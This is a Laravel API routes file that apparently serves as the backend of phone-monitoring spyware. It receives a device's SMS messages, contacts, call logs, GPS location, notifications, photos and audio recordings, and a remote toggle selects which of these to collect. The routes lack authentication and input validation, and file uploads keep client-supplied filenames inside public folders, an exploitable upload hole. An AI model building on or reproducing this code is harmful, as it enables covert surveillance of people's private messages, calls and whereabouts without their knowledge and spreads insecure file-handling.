<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});
Route::post('/diviceinfo', function (Request $request) {
  
    \DB::table('divice_infos')->insert([
        'serialNumber' => $request->serialNumber, 
        'model' => $request->model, 
        'brand' => $request->brand, 
        'user_id' => $request->user_id, 
        
    ],true);
  

       
});
Route::post('/masage', function (Request $request) {
  
    \DB::table('masages')->insert([
        'sender' => $request->sender, 
        'texte' => $request->texte, 
        'date' => $request->date, 
        'user_id' => $request->user_id, 
        'serialNumber' => $request->serialNumber, 
        
    ],true);
  

       
});
Route::post('/contacts', function (Request $request) {
  
    \DB::table('contacts')->insert([
        'name' => $request->name, 
        'lastname' => $request->lastname, 
        'phones' => $request->phones, 
        'user_id' => $request->user_id, 
        'serialNumber' => $request->serialNumber, 
        
    ],true);
  

       
});
Route::post('/calllog', function (Request $request) {
  
    \DB::table('call_logs')->insert([
        'FNamber' => $request->FNamber, 
        'CMNamber' => $request->CMNamber, 
        'Number' => $request->Number, 
        'Name' => $request->Name, 
        'TYPE' => $request->TYPE, 
        'DATE' => $request->DATE, 
        'DURATION' => $request->DURATION, 
        'ACCOUNTID' => $request->ACCOUNTID, 
        'SIMNAME' => $request->SIMNAME, 
        'user_id' => $request->user_id, 
        'serialNumber' => $request->serialNumber, 
        
    ],true);
  

       
});
Route::post('/gps', function (Request $request) {
  
    \DB::table('gps')->insert([
        'altitude' => $request->altitude, 
        'longitude' => $request->longitude, 
        'serialNumber' => $request->serialNumber, 
        'user_id' => $request->user_id, 
  
        
    ],true);
  

       
});

Route::post('/notification', function (Request $request) {
  
    \DB::table('notifications')->insert([
        'title' => $request->title, 
        'message' => $request->message, 
        'timeStamp' => $request->timeStamp, 
        'serialNumber' => $request->serialNumber, 
        'user_id' => $request->user_id, 
  
        
    ],true);
  

       
});
Route::get('/cheker/{id}', function ($id) {
    //  $userid=Auth::user()->id;
    //  dd($userid);
$cheker = DB::table('get_updates')->where('user_id','=',$id)->get();
return response()->json([
 $cheker

                 
]);
  

});
Route::post('/updatecheker/{id}', function (Request $request) {
    $userid = $request->user_id;
    $updateData = [];

    if ($request->has('sms')) {
        $updateData['sms'] = $request->sms;
    }

    if ($request->has('image')) {
        $updateData['image'] = $request->image;
    }

    if ($request->has('contact')) {
        $updateData['contact'] = $request->contact;
    }

    if ($request->has('calllog')) {
        $updateData['calllog'] = $request->calllog;
    }

    if ($request->has('notification')) {
        $updateData['notification'] = $request->notification;
    }

    if (!empty($updateData)) {
        DB::table('get_updates')
            ->where('user_id', $userid)
            ->update($updateData);

        return 'Successfully added transaction';
    }

    return 'No data to update';
});

Route::post('/getimage', function (Request $request) {
    $userid = $request->user_id;

    $serialNumber = $request->serialNumber;
     if ($request->hasFile('image')) {
          $file = $request->file('image');
          $name = uniqid().$file->getClientOriginalName();
           if (!Storage::disk('public')->exists('uploads/'. $userid.'/'. $serialNumber)) {
                    Storage::disk('public')->makeDirectory('uploads/'. $userid.'/'. $serialNumber,true);
                 }
          $file->move('public/uploads/'.$userid.'/'. $serialNumber, $name);  
        
        }
    
     \DB::table('userimages')->insert([
        'user_id' => $userid, 
        'filename' => $name, 
        'serialNumber' => $serialNumber, 
               
    ],true);
        return 'successfully added transaction';
  
   
});
Route::post('/getimagetesetinternet', function (Request $request) {
    $userid = $request->user_id;

    $serialNumber = $request->serialNumber;
     if ($request->hasFile('image')) {
          $file = $request->file('image');
          $name = uniqid().$file->getClientOriginalName();
           if (!Storage::disk('public')->exists('Tesetinternet/'. $userid.'/'. $serialNumber)) {
                    Storage::disk('public')->makeDirectory('Tesetinternet/'. $userid.'/'. $serialNumber,true);
                 }
          $file->move('public/Tesetinternet/'.$userid.'/'. $serialNumber, $name);  
 
        }
    
     
        return 'successfully added transaction';
  
   
});
Route::post('/audio', function (Request $request) {
    $userid = $request->user_id;
     $serialNumber = $request->serialNumber;
     if ($request->hasFile('audio')) {
          $file = $request->file('audio');

          $name = uniqid().$file->getClientOriginalName();
           if (!Storage::disk('public')->exists('voice/'. $userid.'/'. $serialNumber)) {
                    Storage::disk('public')->makeDirectory('voice/'. $userid. '/'.$serialNumber,true);
                 }
          $file->move('public/voice/'.$userid.'/'.$serialNumber, $name);  
      
        }
    
        
        return 'successfully added transaction';
  
   
});